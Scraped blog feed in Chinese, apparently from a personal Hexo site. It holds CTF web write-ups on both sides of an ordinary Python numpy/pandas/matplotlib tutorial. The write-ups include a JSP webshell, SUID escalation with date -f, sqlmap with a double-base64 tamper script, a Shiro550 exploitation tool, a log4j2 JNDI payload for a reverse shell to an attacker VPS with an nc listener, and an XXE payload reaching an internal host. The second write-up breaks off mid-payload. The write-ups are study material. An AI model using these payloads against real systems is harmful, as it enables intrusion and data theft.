class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><code>jar -cvf shell.war shell.jsp</code></p><p>访问<code>http://47.76.71.50:20022/shell/shell.jsp</code>发现木马上传成功</p><p>蚁剑连接，密码<code>passwd</code></p><p>在根目录发现<code>flag.txt</code>，但是没有权限，根据题目描述考虑suid提权</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/date</span><br><span class="line">/usr/bin/su</span><br></pre></td></tr></table></figure><p>这里对能提权的命令不熟，一个个查，发现<code>date</code>命令可用来读取<code>root</code>权限文件</p><p><code>/usr/bin/date -f /flag.txt</code></p><p><img src="https://s2.loli.net/2024/01/15/bLHsWOyQnm5IpZA.png" alt="1"></p><h3 id="ez-sqli">ez_sqli</h3><p><img src="https://www.z4a.net/images/2024/01/15/sql.png" alt="sql"></p><p>发现<code>query</code>经过两次base64编码，虽说是手注，不过感觉可以一把梭</p><p>稍稍修改<code>sqlmap</code>中的<code>base64encode.py</code>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Base64-encodes all characters in a given payload</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&quot;1&#x27; AND SLEEP(5)#&quot;)</span></span><br><span class="line"><span class="string">    &#x27;MScgQU5EIFNMRUVQKDUpIw==&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(encodeBase64(payload, binary=<span class="literal">False</span>), binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure><p>在<code>1.txt</code>粘贴刚才抓到的数据包</p><p><code>python sqlmap.py --tamper base64encode.py -r C:\Users\Admin\Desktop\CTF脚本\SQL注入\1.txt</code>检测注入点</p><p><code>python sqlmap.py --tamper base64encode.py -r C:\Users\Admin\Desktop\CTF脚本\SQL注入\1.txt --dbs</code> 爆库</p><p><code>python sqlmap.py --tamper base64encode.py -r C:\Users\Admin\Desktop\CTF脚本\SQL注入\1.txt -D sql1 --tables</code> 爆表</p><p><code>python sqlmap.py --tamper base64encode.py -r C:\Users\Admin\Desktop\CTF脚本\SQL注入\1.txt -D sql1 -T secrets --dump</code> 爆字段</p><p>拿到flag：<code>SBCTF&#123;a79f93151e564f9dbe6e885035c83a49&#125;</code></p><h3 id="attack-shiro">attack_shiro</h3><p>没啥好说的，<code>shiro550</code>漏洞用工具一把梭即可，<a href="https://github.com/SummerSec/ShiroAttack2">工具连接</a></p><p>虚拟机崩了，重新配环境浪费了些时间</p><blockquote><p>需要Java8环境</p></blockquote><p><img src="https://s2.loli.net/2024/01/17/IANQvRsjOefXH5u.png" alt="shiroattack"></p><h3 id="java-signin">java_signin</h3><p><img src="https://s2.loli.net/2024/01/21/8xBG2lRi3NuFzon.png" alt="1"></p><p>给了jar包，用<code>jadx</code>反编译发现只有一个跳转到原神官网的路由</p><p>maven发现log4j2依赖，猜测是<a href="https://blog.csdn.net/csdnmmd/article/details/128369369">jog4j2远程代码执行漏洞</a>，在Accept处试探发现注入点</p><p>在自己的vps上使用<code>JNDI</code>工具，监听端口</p><p>``java -jar JNDIExploit.jar -i ip`</p><p><code>nc -lvvp 9000</code></p><p>构造payload：<code>Accept: $&#123;jndi:ldap://ip:1389/Basic/ReverseShell/ip/port&#125;</code></p><p>反弹shell成功，<code>cat /flag</code>即可</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python数学建模</title>
      <link href="/2024/01/01/python%20%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
      <url>/2024/01/01/python%20%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<h1>python 数学建模</h1><h2 id="python-常用库">python 常用库</h2><h3 id="数值计算-numpy">数值计算-Numpy</h3><p><a href="https://numpy.net/doc/stable/index.html">帮助文档</a></p><p><strong>常用操作</strong></p><p>1、创建数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(arr)) <span class="comment"># &lt;class &#x27;numpy.ndarray&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>多维</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>],</span><br><span class="line">                [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr.shape) <span class="comment"># 属性：(2, 5)</span></span><br></pre></td></tr></table></figure><p>2、索引和切片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">arr1 = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">arr2 = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">                 [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">                 [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr1[<span class="number">0</span>])<span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(arr1[<span class="number">0</span>: <span class="number">3</span>])<span class="comment"># [1 2 3]</span></span><br><span class="line"><span class="built_in">print</span>(arr2[<span class="number">0</span>])<span class="comment"># [1 2 3]</span></span><br><span class="line"><span class="built_in">print</span>(arr2[<span class="number">0</span>: <span class="number">2</span>])</span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[[1 2 3]</span></span><br><span class="line"><span class="string"> [4 5 6]]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>3、运算</p><p>python中列表加法为拼接，np中为向量加法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr1 = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">arr2 = np.array([<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr1 + arr2)<span class="comment"># [5 7 9]</span></span><br><span class="line"><span class="built_in">print</span>(arr1 * arr2)<span class="comment"># [ 4 10 18]</span></span><br></pre></td></tr></table></figure><p>点乘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr1 = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">arr2 = np.array([<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(np.dot(arr1, arr2))<span class="comment"># 32</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A = np.array([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])</span><br><span class="line">B = np.array([[<span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>]])</span><br><span class="line">C = np.dot(A, B)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[[19 22]</span></span><br><span class="line"><span class="string"> [43 50]]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>均值、标准差、求和、最大值、最小值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr1 = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(arr1.mean())<span class="comment"># 2.0</span></span><br><span class="line"><span class="built_in">print</span>(arr1.std())<span class="comment"># 0.816496580927726</span></span><br><span class="line"><span class="built_in">print</span>(arr1.<span class="built_in">sum</span>())</span><br><span class="line"><span class="built_in">print</span>(arr1.<span class="built_in">max</span>())<span class="comment"># 3</span></span><br><span class="line"><span class="built_in">print</span>(arr1.<span class="built_in">min</span>())<span class="comment"># 1</span></span><br></pre></td></tr></table></figure><p>排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.sort(arr)</span><br></pre></td></tr></table></figure><p>4、形状操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">                [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">                [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>],</span><br><span class="line">                [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr.shape)</span><br><span class="line">new_arr = arr.reshape(<span class="number">2</span>, <span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(new_arr)</span><br><span class="line">arr.reshape(-<span class="number">1</span>) <span class="comment"># 变为一维行向量</span></span><br></pre></td></tr></table></figure><p>转置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(new_arr)</span><br><span class="line"><span class="built_in">print</span>(new_arr.transpose())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[[ 1  2  3  4  5  6]</span></span><br><span class="line"><span class="string"> [ 7  8  9 10 11 12]]</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> [[ 1  7]</span></span><br><span class="line"><span class="string"> [ 2  8]</span></span><br><span class="line"><span class="string"> [ 3  9]</span></span><br><span class="line"><span class="string"> [ 4 10]</span></span><br><span class="line"><span class="string"> [ 5 11]</span></span><br><span class="line"><span class="string"> [ 6 12]]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>5、元素筛选</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">arr1 = np.array([[<span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>],</span><br><span class="line">                [<span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr1 &gt; <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(arr1[arr1 &gt; <span class="number">3</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[[False  True False]</span></span><br><span class="line"><span class="string"> [False  True  True]]</span></span><br><span class="line"><span class="string">[4 5 6]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>6、导出和导入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A = np.array([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])</span><br><span class="line">B = np.array([[<span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>]])</span><br><span class="line">C = np.dot(A, B)</span><br><span class="line"></span><br><span class="line">np.save(<span class="string">&quot;arr&quot;</span>, C) <span class="comment"># 导出arr.npy</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr = np.load(<span class="string">&quot;arr.npy&quot;</span>) <span class="comment"># 导入</span></span><br><span class="line"><span class="built_in">print</span>(arr)</span><br></pre></td></tr></table></figure><h3 id="数据处理-pandas">数据处理-Pandas</h3><p><a href="https://pandas.ac.cn/docs/user_guide/index.html">帮助文档</a></p><p>1、读取excel(其他数据格式可查看文档)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_excel(<span class="string">&quot;1.xlsx&quot;</span>, <span class="string">&quot;Sheet1&quot;</span>, engine=<span class="string">&quot;openpyxl&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(df.head(<span class="number">5</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(df))<span class="comment"># &lt;class &#x27;pandas.core.frame.DataFrame&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>将数据转换为pandas格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">&#x27;姓名&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="string">&#x27;成绩&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]&#125;</span><br><span class="line">data_df = pd.DataFrame(data)</span><br><span class="line"><span class="built_in">print</span>(data_df)</span><br></pre></td></tr></table></figure><p>2、查看信息(样本数，数据类型等)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df = pd.read_excel(<span class="string">&quot;1.xlsx&quot;</span>, <span class="string">&quot;Sheet1&quot;</span>, engine=<span class="string">&quot;openpyxl&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(df.info())</span><br></pre></td></tr></table></figure><p>3、处理数据</p><p><strong>缺失值</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df = pd.read_excel(<span class="string">&quot;1.xlsx&quot;</span>, <span class="string">&quot;Sheet1&quot;</span>, engine=<span class="string">&quot;openpyxl&quot;</span>)</span><br><span class="line">df = df.dropna()</span><br></pre></td></tr></table></figure><p><strong>类型转换</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df = pd.read_excel(<span class="string">&quot;1.xlsx&quot;</span>, <span class="string">&quot;Sheet1&quot;</span>, engine=<span class="string">&quot;openpyxl&quot;</span>)</span><br><span class="line">df[<span class="string">&#x27;成绩&#x27;</span>] = df[<span class="string">&#x27;成绩&#x27;</span>].astype(<span class="built_in">float</span>)</span><br><span class="line"><span class="built_in">print</span>(df.info())</span><br></pre></td></tr></table></figure><p>4、数据选择和过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df = pd.read_excel(<span class="string">&quot;1.xlsx&quot;</span>, <span class="string">&quot;Sheet1&quot;</span>, engine=<span class="string">&quot;openpyxl&quot;</span>)</span><br><span class="line">avg = df[<span class="string">&#x27;成绩&#x27;</span>].mean()</span><br><span class="line"><span class="built_in">print</span>(df[df[<span class="string">&#x27;成绩&#x27;</span>] &gt;= avg])</span><br></pre></td></tr></table></figure><p>可按照<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mi>σ</mi></mrow><annotation encoding="application/x-tex">3\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span></span></span></span>原则筛选异常值</p><h3 id="可视化-matplotlib">可视化-Matplotlib</h3><p><a href="https://www.matplotlib.net/stable/tutorials/introductory/quick_start.html">帮助文档</a></p><p><strong>折线图</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">x = np.linspace(<span class="number">0</span>, <span class="number">10</span>, <span class="number">100</span>)  <span class="comment"># 0-10均匀分布</span></span><br><span class="line">y = np.sin(x)</span><br><span class="line">plt.plot(x, y)</span><br><span class="line">plt.title(<span class="string">&quot;y = sin(x)&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><strong>散点图</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x = np.linspace(<span class="number">0</span>, <span class="number">10</span>, <span class="number">10</span>)  <span class="comment"># 0-10均匀分布</span></span><br><span class="line">y = np.sin(x)</span><br><span class="line">plt.scatter(x, y)</span><br><span class="line">plt.title(<span class="string">&quot;y = sin(x)&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><strong>结合（拟合图像绘制）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.pylab <span class="keyword">import</span> mpl <span class="comment"># 一下三行代码为显示中文legend</span></span><br><span class="line">mpl.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">mpl.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">x = np.linspace(<span class="number">0</span>, <span class="number">10</span>, <span class="number">10</span>)  <span class="comment"># 0-10均匀分布</span></span><br><span class="line">y = np.sin(x)</span><br><span class="line">x2 = np.linspace(<span class="number">0</span>, <span class="number">10</span>, <span class="number">100</span>)</span><br><span class="line">y2 = np.sin(x2)</span><br><span class="line">plt.scatter(x, y, marker=<span class="string">&#x27;*&#x27;</span>, c=<span class="string">&#x27;r&#x27;</span>, label=<span class="string">&quot;数据点&quot;</span>) <span class="comment"># 散点</span></span><br><span class="line">plt.plot(x2, y2, linestyle=<span class="string">&#x27;--&#x27;</span>, label=<span class="string">&quot;折线&quot;</span>) <span class="comment"># 拟合曲线</span></span><br><span class="line">plt.legend()</span><br><span class="line">plt.title(<span class="string">&quot;y = sin(x)&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><strong>多图绘制</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = np.linspace(<span class="number">0</span>, <span class="number">10</span>, <span class="number">10</span>)  <span class="comment"># 0-10均匀分布</span></span><br><span class="line">y = np.sin(x)</span><br><span class="line">x2 = np.linspace(<span class="number">0</span>, <span class="number">10</span>, <span class="number">100</span>)</span><br><span class="line">y2 = np.sin(x2)</span><br><span class="line"></span><br><span class="line">fig, axes = plt.subplots(<span class="number">1</span>, <span class="number">2</span>)  <span class="comment"># 一行两列</span></span><br><span class="line">axes[<span class="number">0</span>].scatter(x, y, marker=<span class="string">&#x27;*&#x27;</span>, c=<span class="string">&#x27;r&#x27;</span>, label=<span class="string">&quot;数据点&quot;</span>)  <span class="comment"># 散点</span></span><br><span class="line">axes[<span class="number">0</span>].set_title(<span class="string">&quot;数据点&quot;</span>)</span><br><span class="line">axes[<span class="number">1</span>].plot(x2, y2, linestyle=<span class="string">&#x27;--&#x27;</span>, label=<span class="string">&quot;折线&quot;</span>)  <span class="comment"># 拟合曲线</span></span><br><span class="line">axes[<span class="number">1</span>].set_title(<span class="string">&quot;拟合曲线&quot;</span>)</span><br><span class="line">fig.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><strong>直方图</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">y = [<span class="number">2</span>, <span class="number">4</span>, <span class="number">10</span>]</span><br><span class="line">plt.bar(x, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数学建模 </tag>
            
            <tag> 科学计算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SquareCTF web题解</title>
      <link href="/2023/11/24/SquareCTF/"/>
      <url>/2023/11/24/SquareCTF/</url>
      
        <content type="html"><![CDATA[<h1>SquareCTF</h1><h2 id="sandbox">sandbox</h2><p><code>cat flag.txt</code>无回显，过滤空格用<code>&lt;</code>代替</p><p><img src="https://s2.loli.net/2023/11/24/BIGh1uX7A9LNH4J.png" alt="1"></p><h2 id="be-the-admin">Be The Admin</h2><p>cookie身份认证，改为admin的base64即可，注意出于安全性考虑cookie中不能出现<code>=</code>，base64中<code>=</code>用于占位不影响解密，故删除即可</p><p><img src="https://s2.loli.net/2023/11/24/Xt3hpdqaFjIMe1c.png" alt="2"></p><h2 id="just-go-around">Just Go Around</h2><p><code>xxe</code>+内网探测</p><p>看源码发现<code>/post</code>路由，提交查询跳转到<code>/accept</code>，发现可用<code>postXml</code>参数xxe，先读本地文件</p><p><img src="https://s2.loli.net/2023/11/24/LVG14bqUMKADTef.png" alt="31"></p><p>本地没找到flag文件，要找内网ip，用http访问内网拿flag，然后就是各种读文件找线索</p><p>翻了好多好多层之后在<code>/JustGoAround/src/main/resources/application.properties</code>找到一个端口号<code>spring.datasource.url=http://$&#123;ELASTIC_HOST:db&#125;:9200</code>，读<code>/etc/hosts</code>找到一个ip<code>172.21.0.3</code></p><p>直接访问发现不对，多试试找到<code>172.21.0.2</code></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY foo SYSTEM &quot;http://172.21.0.2:9200/_search?q=*&quot;&gt;]&gt;&lt;post author=&quot;CTF&quot; id=&quot;0&quot; 